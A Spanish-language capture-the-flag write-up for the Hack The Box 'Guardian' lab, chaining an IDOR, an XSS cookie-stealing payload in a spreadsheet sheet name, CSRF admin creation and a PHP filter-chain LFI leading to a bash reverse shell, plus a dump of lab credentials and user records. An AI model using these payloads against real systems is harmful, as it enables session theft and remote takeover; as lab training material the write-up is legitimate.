# HTB: Guardian

## Host: Linux
## IP: 10.10.11.84

## Procedimiento y comandos
#### Paso 1: Enumeracion

* Nmap

```bash
PORT      STATE    SERVICE     REASON         VERSION
22/tcp    open     ssh         syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 9c:69:53:e1:38:3b:de:cd:42:0a:c8:6b:f8:95:b3:62 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEtPLvoTptmr4MsrtI0K/4A73jlDROsZk5pUpkv1rb2VUfEDKmiArBppPYZhUo+Fopcqr4j90edXV+4Usda76kI=
|   256 3c:aa:b9:be:17:2d:5e:99:cc:ff:e1:91:90:38:b7:39 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHTkehIuVT04tJc00jcFVYdmQYDY3RuiImpFenWc9Yi6
80/tcp    open     http        syn-ack ttl 63 Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://guardian.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
4023/tcp  filtered esnm-zoning no-response
5612/tcp  filtered unknown     no-response
5644/tcp  filtered unknown     no-response
6447/tcp  filtered unknown     no-response
6484/tcp  filtered sun-sr-jms  no-response
7139/tcp  filtered unknown     no-response
7920/tcp  filtered unknown     no-response
8354/tcp  filtered unknown     no-response
10522/tcp filtered unknown     no-response
10991/tcp filtered unknown     no-response
11290/tcp filtered unknown     no-response
12185/tcp filtered unknown     no-response
12985/tcp filtered unknown     no-response
14710/tcp filtered unknown     no-response
15482/tcp filtered unknown     no-response
16799/tcp filtered unknown     no-response
19511/tcp filtered unknown     no-response
19858/tcp filtered unknown     no-response
19885/tcp filtered unknown     no-response
20932/tcp filtered unknown     no-response
22896/tcp filtered unknown     no-response
24318/tcp filtered unknown     no-response
24579/tcp filtered unknown     no-response
24935/tcp filtered unknown     no-response
27531/tcp filtered unknown     no-response
33428/tcp filtered unknown     no-response
33605/tcp filtered unknown     no-response
37135/tcp filtered unknown     no-response
37856/tcp filtered unknown     no-response
44110/tcp filtered unknown     no-response
44146/tcp filtered unknown     no-response
44369/tcp filtered unknown     no-response
45197/tcp filtered unknown     no-response
46536/tcp filtered unknown     no-response
48504/tcp filtered unknown     no-response
49110/tcp filtered unknown     no-response
49754/tcp filtered unknown     no-response
52108/tcp filtered unknown     no-response
54992/tcp filtered unknown     no-response
55607/tcp filtered unknown     no-response
56515/tcp filtered unknown     no-response
56651/tcp filtered unknown     no-response
56995/tcp filtered unknown     no-response
58128/tcp filtered unknown     no-response
60917/tcp filtered unknown     no-response
64059/tcp filtered unknown     no-response
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=9/27%OT=22%CT=1%CU=34897%PV=Y%DS=2%DC=T%G=Y%TM=68D80E2
OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST1
OS:1NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 31.673 days (since Tue Aug 26 21:09:05 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: _default_; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT       ADDRESS
1   232.39 ms 10.10.14.1
2   232.77 ms 10.10.11.84

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:17
Completed NSE at 13:17, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:17
Completed NSE at 13:17, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:17
Completed NSE at 13:17, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 853.34 seconds
           Raw packets sent: 73804 (3.248MB) | Rcvd: 87051 (7.146MB)
```

* Directory: dirsearch

```bash
dirsearch -u http://guardian.htb

/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/HTB/Guardian/reports/http_guardian.htb/_25-09-27_13-12-55.txt

Target: http://guardian.htb/

[13:12:55] Starting: 
[13:12:58] 301 -  309B  - /js  ->  http://guardian.htb/js/                  
[13:13:06] 403 -  277B  - /.ht_wsr.txt                                      
[13:13:06] 403 -  277B  - /.htaccess.bak1                                   
[13:13:06] 403 -  277B  - /.htaccess.orig                                   
[13:13:06] 403 -  277B  - /.htaccess.sample
[13:13:06] 403 -  277B  - /.htaccess.save                                   
[13:13:06] 403 -  277B  - /.htaccess_extra
[13:13:06] 403 -  277B  - /.htaccess_sc
[13:13:06] 403 -  277B  - /.htaccess_orig
[13:13:06] 403 -  277B  - /.htaccessOLD
[13:13:06] 403 -  277B  - /.htaccessBAK
[13:13:06] 403 -  277B  - /.htaccessOLD2
[13:13:06] 403 -  277B  - /.htm                                             
[13:13:06] 403 -  277B  - /.html                                            
[13:13:06] 403 -  277B  - /.htpasswd_test                                   
[13:13:06] 403 -  277B  - /.htpasswds
[13:13:06] 403 -  277B  - /.httr-oauth
[13:13:13] 403 -  277B  - /.php                                             
[13:14:07] 403 -  277B  - /cgi-bin/                                         
[13:14:17] 301 -  310B  - /css  ->  http://guardian.htb/css/                
[13:14:40] 301 -  313B  - /images  ->  http://guardian.htb/images/          
[13:14:40] 403 -  277B  - /images/                                          
[13:14:43] 404 -   16B  - /index.php/login/                                 
[13:14:48] 301 -  317B  - /javascript  ->  http://guardian.htb/javascript/  
[13:14:50] 403 -  277B  - /js/                                              
[13:15:13] 403 -  277B  - /php5.fcgi                                        
[13:15:38] 403 -  277B  - /server-status/                                   
[13:15:38] 403 -  277B  - /server-status                                    
                                                                             
Task Completed 
```

* Subdomains: 

> Ni FFuf ni gobuster devuelven el subdominio a pesar de que este se encuentra en la wordlist

Al inspeccionar los links de la pagina web notamos **portal.guardian.htb** lo agregamos a nuestros hosts y navegamos ahi

Interactuando con el sitio vemos una notificacion que nos indica que revisemos la guia de usuario del sitio, por lo tanto inferimos que debe haber un pdf por ahi:

```bash
feroxbuster -u http://portal.guardian.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php,pdf,html,txt,js,txt,log --dont-filter --status-codes 200,204,301,302,307,403,401 --threads 50
                                                                                                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher ü§ì                 ver: 2.11.0
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üéØ  Target Url            ‚îÇ http://portal.guardian.htb
 üöÄ  Threads               ‚îÇ 50
 üìñ  Wordlist              ‚îÇ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 üëå  Status Codes          ‚îÇ [200, 204, 301, 302, 307, 403, 401]
 üí•  Timeout (secs)        ‚îÇ 7
 ü¶°  User-Agent            ‚îÇ feroxbuster/2.11.0
 üíâ  Config File           ‚îÇ /etc/feroxbuster/ferox-config.toml
 üîé  Extract Links         ‚îÇ true
 üí≤  Extensions            ‚îÇ [php, pdf, html, txt, js, txt, log]
 üèÅ  HTTP methods          ‚îÇ [GET]
 ü§™  Filter Wildcards      ‚îÇ false
 üîÉ  Recursion Depth       ‚îÇ 4
 üéâ  New Version Available ‚îÇ https://github.com/epi052/feroxbuster/releases/latest
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üèÅ  Press [ENTER] to use the Scan Management Menu‚Ñ¢
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
301      GET        9l       28w      329c http://portal.guardian.htb/includes => http://portal.guardian.htb/includes/
200      GET      168l      310w     3201c http://portal.guardian.htb/static/styles/login.css
200      GET       38l       92w     1383c http://portal.guardian.htb/forgot.php
200      GET        9l      125w    73890c http://portal.guardian.htb/static/vendor/fontawesome/css/all.min.css
403      GET        9l       28w      284c http://portal.guardian.htb/static/
302      GET        0l        0w        0c http://portal.guardian.htb/ => http://portal.guardian.htb/login.php
403      GET        9l       28w      284c http://portal.guardian.htb/static/styles/
200      GET      607l     3253w   210067c http://portal.guardian.htb/static/downloads/Guardian_University_Student_Portal_Guide.pdf
301      GET        9l       28w      326c http://portal.guardian.htb/admin => http://portal.guardian.htb/admin/
302      GET        0l        0w        0c http://portal.guardian.htb/logout.php => http://portal.guardian.htb/login.php
403      GET        9l       28w      284c http://portal.guardian.htb/.php
301      GET        9l       28w      335c http://portal.guardian.htb/includes/admin => http://portal.guardian.htb/includes/admin/
403      GET        9l       28w      284c http://portal.guardian.htb/includes/.php
403      GET        9l       28w      284c http://portal.guardian.htb/includes/.html
403      GET        9l       28w      284c http://portal.guardian.htb/.html
200      GET       84l      184w     2900c http://portal.guardian.htb/login.php
301      GET        9l       28w      349c http://portal.guardian.htb/static/vendor/fontawesome/js => http://portal.guardian.htb/static/vendor/fontawesome/js/
301      GET        9l       28w      327c http://portal.guardian.htb/config => http://portal.guardian.htb/config/
301      GET        9l       28w      331c http://portal.guardian.htb/javascript => http://portal.guardian.htb/javascript/
200      GET        0l        0w        0c http://portal.guardian.htb/config/config.php
301      GET        9l       28w      334c http://portal.guardian.htb/static/styles => http://portal.guardian.htb/static/styles/
301      GET        9l       28w      327c http://portal.guardian.htb/static => http://portal.guardian.htb/static/
200      GET        0l        0w        0c http://portal.guardian.htb/config/db.php
302      GET        0l        0w        0c http://portal.guardian.htb/admin/users.php => http://portal.guardian.htb/login.php
302      GET        0l        0w        0c http://portal.guardian.htb/admin/chat.php => http://portal.guardian.htb/login.php
200      GET        0l        0w        0c http://portal.guardian.htb/includes/auth.php
302      GET        0l        0w        0c http://portal.guardian.htb/admin/profile.php => http://portal.guardian.htb/login.php
200      GET      173l      316w     3286c http://portal.guardian.htb/static/styles/forgot.css
403      GET        9l       28w      284c http://portal.guardian.htb/server-status
301      GET        9l       28w      334c http://portal.guardian.htb/admin/notices => http://portal.guardian.htb/admin/notices/
403      GET        9l       28w      284c http://portal.guardian.htb/admin/.php
403      GET        9l       28w      284c http://portal.guardian.htb/admin/.html
200      GET        0l        0w        0c http://portal.guardian.htb/admin/notices/delete.php
302      GET        0l        0w        0c http://portal.guardian.htb/admin/notices/approve.php => http://portal.guardian.htb/login.php
[##>-----------------] - 9m    286236/2552352 78m     found:34      errors:77636  
[##>-----------------] - 9m    286242/2552352 78m     found:34      errors:77636  
[######>-------------] - 9m     69080/212672  132/s   http://portal.guardian.htb/ 
[######>-------------] - 9m     71664/212672  137/s   http://portal.guardian.htb/includes/ 
[##>-----------------] - 9m    286250/2552352 78m     found:34      errors:77636  
[######>-------------] - 9m     69080/212672  132/s   http://portal.guardian.htb/ 
[######>-------------] - 9m     71664/212672  137/s   http://portal.guardian.htb/includes/ 
[##>-----------------] - 9m    286261/2552352 78m     found:34      errors:77637  
[######>-------------] - 9m     69080/212672  132/s   http://portal.guardian.htb/ 
[######>-------------] - 9m     71664/212672  137/s   http://portal.guardian.htb/includes/ 
[######>-------------] - 9m     71272/212672  137/s   http://portal.guardian.htb/static/ 
[######>-------------] - 9m     69544/212672  134/s   http://portal.guardian.htb/static/styles/ 
[######>-------------] - 9m     65136/212672  126/s   http://portal.guardian.htb/admin/ 
[######>-------------] - 9m     66384/212672  128/s   http://portal.guardian.htb/includes/admin/ 
[##>-----------------] - 9m    286294/2552352 78m     found:34      errors:77637  
[######>-------------] - 9m     69088/212672  131/s   http://portal.guardian.htb/ 
[######>-------------] - 9m     71664/212672  137/s   http://portal.guardian.htb/includes/ 
[###>----------------] - 11m   408462/2552352 57m     found:34      errors:125400 
üö® Caught ctrl+c üö® saving scan state to ferox-http_portal_guardian_htb-1758993573.state ...
[###>----------------] - 11m   408469/2552352 57m     found:34      errors:125400 
[#########>----------] - 11m   105256/212672  153/s   http://portal.guardian.htb/ 
[#########>----------] - 11m   106224/212672  155/s   http://portal.guardian.htb/includes/ 
[#########>----------] - 11m   103696/212672  152/s   http://portal.guardian.htb/static/ 
[#########>----------] - 11m   105896/212672  155/s   http://portal.guardian.htb/static/styles/ 
[#########>----------] - 11m   100680/212672  148/s   http://portal.guardian.htb/admin/ 
[#########>----------] - 11m   105416/212672  155/s   http://portal.guardian.htb/includes/admin/ 
[##########>---------] - 11m   112328/212672  166/s   http://portal.guardian.htb/static/downloads/ 
[#########>----------] - 11m    99480/212672  147/s   http://portal.guardian.htb/static/vendor/ 
[#########>----------] - 11m    97536/212672  144/s   http://portal.guardian.htb/static/vendor/fontawesome/ 
[##########>---------] - 11m   108512/212672  161/s   http://portal.guardian.htb/config/ 
[##########>---------] - 11m   113040/212672  169/s   http://portal.guardian.htb/javascript/ 
[######>-------------] - 9m     70888/212672  133/s   http://portal.guardian.htb/admin/notices/  
```

Vemos un par de cosas interesantes:

1. http://portal.guardian.htb/static/downloads/Guardian_University_Student_Portal_Guide.pdf

2. Vemos en el sitio en la seccon "Student Testimonials" ejecmplos de usuarios:

```bash
GU0142023@guardian.htb
GU6262023@guardian.htb
GU0702025@guardian.htb
```
3. Dentro del pdf encontramos un password por defecto **GU1234**


A partir de aqui tenemos dos bias.

1. Podemos generar una lista de usuarios con una regla que agregue GU adelante de un digito aleatorio de 3 numeros + un year 2025 2024 2023 etc..

> **Lento** pero quizas encontramos usuarios de mayor valor o con mas privilegios

2. Podemos intentar con los usuarios que tenemos.

> **rapido** son solo 3 usuarios se pruban y se corrobora.

```bash
GU0142023
GU6262023
GU0702025
```
Vamos por la bia rapida e intentamos con GU0142023 obtenieendo acceso: http://portal.guardian.htb/student/home.php

Navegando por el portal encontramos varios usuarios internos, generamos una lista.

Luego buscamos inputs que nos permitan cargar documentos. La seccion Assignments provee asignacions o tareas que el usuario debe entregar.
La unica que no esta vencida contiene un input de tipo file. (docx y xlsx)

Ponemos el foco en las url que en las distintas secciones del sitio.

Chats:

1. Con => GU6262023
```bash
http://portal.guardian.htb/student/chat.php?chat_users[0]=13&chat_users[1]=14
```

2. Con => mireille.feek

```bash
http://portal.guardian.htb/student/chat.php?chat_users[0]=13&chat_users[1]=11
```

Parece ser que nuestro id es [13]

3. Probamos chatear con admin:

```bash
http://portal.guardian.htb/student/chat.php?chat_users[0]=13&chat_users[1]=1
```

y su id es [1]

manipulamos los valores de nuestro id con burp para ver posibles respuestas y obtenemos una respuesta positiva con el valor [2]

```bash
/student/chat.php?chat_users[0]=2&chat_users[1]=1 
```

El usuario jamil.enockson recibio el siguiente mensage de admin:

```bash
Here is your password for gitea: DHsNnk3V503
```
Hay mas mensages pero no resultan reelevantes

asumimos un subdominio gitea.guardian.htb, agregamos el host a nuestro /etc/hosts y nos logueamos con las credenciales:

* jamil.enockson@guardian.htb / DHsNnk3V503

Del repo obtenemos:

/config.php

```bash
<?php
return [
    'db' => [
        'dsn' => 'mysql:host=localhost;dbname=guardiandb',
        'username' => 'root',
        'password' => 'Gu4rd14n_un1_1s_th3_b3st',
        'options' => []
    ],
    'salt' => '8Sb)tM1vs1SS'
];
```

/composer.json

```bash
# Dependencias
{
    "require": {
        "phpoffice/phpspreadsheet": "3.7.0",
        "phpoffice/phpword": "^1.3"
    }
}
```

Podemos buscar vulnerabilidades relacionadas a esas dependencias:
La gran mayoria habla de Cross Site Scripting: 

[CVE-2025-22131](https://www.cve.org/CVERecord?id=CVE-2025-22131)
[GitHub poc](https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-79xx-vf93-p7cx)

Si la poc es factible.. podemos robar una cookie valida por medio de XSS y generar un Cookie Hijacking, que nos conduce indefectiblemente a un secuestro de sesion

Payload:

```bash
'"><img src=x onerror=fetch("http://10.10.14.22/?c="+document.cookie)>'
```

Generamos un documento .xlsx con varias hojas de calculo y nombramos una con nuestro payload

Levantamos un servidor python que actue de receptor.. y subimos en asignements nuestro .xslx malicioso

Receptor:

```bash
python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.84 - - [27/Sep/2025 19:08:17] "GET /?c=PHPSESSID=na2q33hbs213ats00n7i36rikp HTTP/1.1" 200 -
```
Obtenemos el cookie, reemplazamos nuestro cookie por este y obtenemos la sesion de otro usuario.

Una vez reemplazado el cookie en el navegador podemos navegamos en el sitio y obtenemos la sesion de **sammy.treat**

A estas alturas la maquina es un encadenamiento de vulnerabilidades pasamos del IDOR => XSS => Cookie/Session Hijacking =>

Observamos las puertas que se abren al acceer como este usuario y notamos que ahora podemos crear "noticias"

Al crear una noticia utilizamos un token csrf_token que vemos al inspeccionar el condigo fuente en la pagina (no en el repo) para crear un .html malicioso y apuntar al endpoint que genera usuarios.
Esto creara un usuario del cual obviamente sabemos las credenciales con permisos administrativos elevados.

Creamos la noticia y en el link de referencia le pasamos nuestra ip con el archivo malito.html

http://10.10.14.22/malito.html

Cuando la noticia se suba unos momentos despues podremos ver en el servidor python

```bash
10.10.11.84 - - [28/Sep/2025 01:22:18] "GET /csrf.html HTTP/1.1" 200 -
10.10.11.84 - - [28/Sep/2025 01:22:19] code 404, message File not found
10.10.11.84 - - [28/Sep/2025 01:22:19] "GET /favicon.ico HTTP/1.1" 404 -
```

Podemos loguearnos con nuestras credenciales: duckman / pass123

Desde el panel administrativo se complica a simple vista encontrar algo que nos sirva clonamos el repo con las credenciales de jamil y analizamos el codigo
encontramos en los report.php lo siguiente:

```php
$report = $_GET['report'] ?? 'reports/academic.php';

if (strpos($report, '..') !== false) {
    die("<h2>Malicious request blocked üö´ </h2>");
}   

if (!preg_match('/^(.*(enrollment|academic|financial|system)\.php)$/', $report)) {
    die("<h2>Access denied. Invalid file üö´</h2>");
}
```

Podemos llegar a inferir posible LFI y posterior RCE.. la url es la siguiente: http://portal.guardian.htb/admin/reports.php?report=reports/enrollment.php
hay una expresion regular que nos "obliga" con esa clausula de guarda a esos 4 archvios php como parametro obligatorio.. 

Una busqueda rapida en nuestra fuente de confianza [Hacktricks](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-php-filters.html) nos instruye y explica como explotar esto.

y mirando mejor.. preg_match permite cualquier prefijo antes del nombre v√°lido:
El patr√≥n ^(.*(enrollment|academic|financial|system)\.php)$ solamente exige que la cadena termine en ...academic.php (o enrollment.php, etc.). 
No exige que el nombre sea exactamente reports/academic.php, ni que no haya protocolos/wrappers delante.
Eso significa que una cadena como:

```bash
php://filter/convert.base64-encode/resource=reports/academic.php
```

Tampoco hay comprobaci√≥n de wrappers o esquema (php://, data://, expect://). El strpos solo busca .. (protege contra traversal cl√°sico) pero no comprueba :// 
ni la presencia de php://filter. Los stream-wrappers quedan permitidos.

include aceptar√° el stream: 
cuando el include recibe php://filter/.../resource=... va a aplicar los filtros sobre el recurso indicado. 
Con la t√©cnica del art√≠culo se pueden usar filtros complejos (o usar php://temp si se encuentra forma de que el nombre final termine en .php o si la inclusi√≥n del wrapper lo permite) 
para fabricar contenido que termine siendo c√≥digo PHP ejecutable.

Buscamos algun [tool](https://github.com/synacktiv/php_filter_chain_generator) que nos ayude a generar el filtro encadenado..

Payload:

```bash
python php_filter_chain_generator.py --chain '<?php system("bash -c '\''bash -i >& /dev/tcp/10.10.14.22/4444 0>&1'\''");?>'
```

Curl:

```bash
curl -i 'http://portal.guardian.htb/admin/reports.php?report=<salida del comando anterior>,system.php' \
  -H 'Host: portal.guardian.htb' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Connection: keep-alive' \
  -H 'Referer: http://portal.guardian.htb/admin/reports.php' \
  -H 'Cookie: PHPSESSID=b9g3nccbfq9paiumec5qolb4b6' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Priority: u=0, i' \
  --compressed
```

Receptor:

```bash
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.22] from (UNKNOWN) [10.10.11.84] 48632
bash: cannot set terminal process group (1103): Inappropriate ioctl for device
bash: no job control in this shell
www-data@guardian:~/portal.guardian.htb/admin$
```

Habiamos visto credenciales para dumpear la base de datos.. utilizaremos dichas credenciales

```bash
mysql -u root -h 127.0.0.1 -p guardiandb

mysql> SHOW DATABASES;
SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| guardiandb         |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.00 sec)

mysql> SHOW TABLES;
SHOW TABLES;
+----------------------+
| Tables_in_guardiandb |
+----------------------+
| assignments          |
| courses              |
| enrollments          |
| grades               |
| messages             |
| notices              |
| programs             |
| submissions          |
| users                |
+----------------------+
9 rows in set (0.00 sec)

mysql> SELECT * FROM users;
SELECT * FROM users;
+---------+--------------------+------------------------------------------------------------------+----------------------+---------------------------------+------------+-------------------------------------------------------------------------------+-----------+--------+---------------------+---------------------+
| user_id | username           | password_hash                                                    | full_name            | email                           | dob        | address                                                                       | user_role | status | created_at          | updated_at          |
+---------+--------------------+------------------------------------------------------------------+----------------------+---------------------------------+------------+-------------------------------------------------------------------------------+-----------+--------+---------------------+---------------------+
|       1 | admin              | 694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6 | System Admin         | admin@guardian.htb              | 2003-04-09 | 2625 Castlegate Court, Garden Grove, California, United States, 92645         | admin     | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|       2 | jamil.enockson     | c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250 | Jamil Enocksson      | jamil.enockson@guardian.htb     | 1999-09-26 | 1061 Keckonen Drive, Detroit, Michigan, United States, 48295                  | admin     | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|       3 | mark.pargetter     | 8623e713bb98ba2d46f335d659958ee658eb6370bc4c9ee4ba1cc6f37f97a10e | Mark Pargetter       | mark.pargetter@guardian.htb     | 1996-04-06 | 7402 Santee Place, Buffalo, New York, United States, 14210                    | admin     | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|       4 | valentijn.temby    | 1d1bb7b3c6a2a461362d2dcb3c3a55e71ed40fb00dd01d92b2a9cd3c0ff284e6 | Valentijn Temby      | valentijn.temby@guardian.htb    | 1994-05-06 | 7429 Gustavsen Road, Houston, Texas, United States, 77218                     | lecturer  | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|       5 | leyla.rippin       | 7f6873594c8da097a78322600bc8e42155b2db6cce6f2dab4fa0384e217d0b61 | Leyla Rippin         | leyla.rippin@guardian.htb       | 1999-01-30 | 7911 Tampico Place, Columbia, Missouri, United States, 65218                  | lecturer  | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|       6 | perkin.fillon      | 4a072227fe641b6c72af2ac9b16eea24ed3751211fb6807cf4d794ebd1797471 | Perkin Fillon        | perkin.fillon@guardian.htb      | 1991-03-19 | 3225 Olanta Drive, Atlanta, Georgia, United States, 30368                     | lecturer  | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|       7 | cyrus.booth        | 23d701bd2d5fa63e1a0cfe35c65418613f186b4d84330433be6a42ed43fb51e6 | Cyrus Booth          | cyrus.booth@guardian.htb        | 2001-04-03 | 4214 Dwight Drive, Ocala, Florida, United States, 34474                       | lecturer  | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|       8 | sammy.treat        | c7ea20ae5d78ab74650c7fb7628c4b44b1e7226c31859d503b93379ba7a0d1c2 | Sammy Treat          | sammy.treat@guardian.htb        | 1997-03-26 | 13188 Mount Croghan Trail, Houston, Texas, United States, 77085               | lecturer  | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|       9 | crin.hambidge      | 9b6e003386cd1e24c97661ab4ad2c94cc844789b3916f681ea39c1cbf13c8c75 | Crin Hambidge        | crin.hambidge@guardian.htb      | 1997-09-28 | 4884 Adrienne Way, Flint, Michigan, United States, 48555                      | lecturer  | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      10 | myra.galsworthy    | ba227588efcb86dcf426c5d5c1e2aae58d695d53a1a795b234202ae286da2ef4 | Myra Galsworthy      | myra.galsworthy@guardian.htb    | 1992-02-20 | 13136 Schoenfeldt Street, Odessa, Texas, United States, 79769                 | lecturer  | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      11 | mireielle.feek     | 18448ce8838aab26600b0a995dfebd79cc355254283702426d1056ca6f5d68b3 | Mireielle Feek       | mireielle.feek@guardian.htb     | 2001-08-01 | 13452 Fussell Way, Raleigh, North Carolina, United States, 27690              | lecturer  | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      12 | vivie.smallthwaite | b88ac7727aaa9073aa735ee33ba84a3bdd26249fc0e59e7110d5bcdb4da4031a | Vivie Smallthwaite   | vivie.smallthwaite@guardian.htb | 1993-04-02 | 8653 Hemstead Road, Houston, Texas, United States, 77293                      | lecturer  | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      13 | GU0142023          | 5381d07c15c0f0107471d25a30f5a10c4fd507abe322853c178ff9c66e916829 | Boone Basden         | GU0142023@guardian.htb          | 2001-09-12 | 10523 Panchos Way, Columbus, Ohio, United States, 43284                       | student   | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      14 | GU6262023          | 87847475fa77edfcf2c9e0973a91c9b48ba850e46a940828dfeba0754586938f | Jamesy Currin        | GU6262023@guardian.htb          | 2001-11-28 | 13972 Bragg Avenue, Dulles, Virginia, United States, 20189                    | student   | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      15 | GU0702025          | 48b16b7f456afa78ba00b2b64b4367ded7d4e3daebf08b13ff71a1e0a3103bb1 | Stephenie Vernau     | GU0702025@guardian.htb          | 1996-04-16 | 14649 Delgado Avenue, Tacoma, Washington, United States, 98481                | student   | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
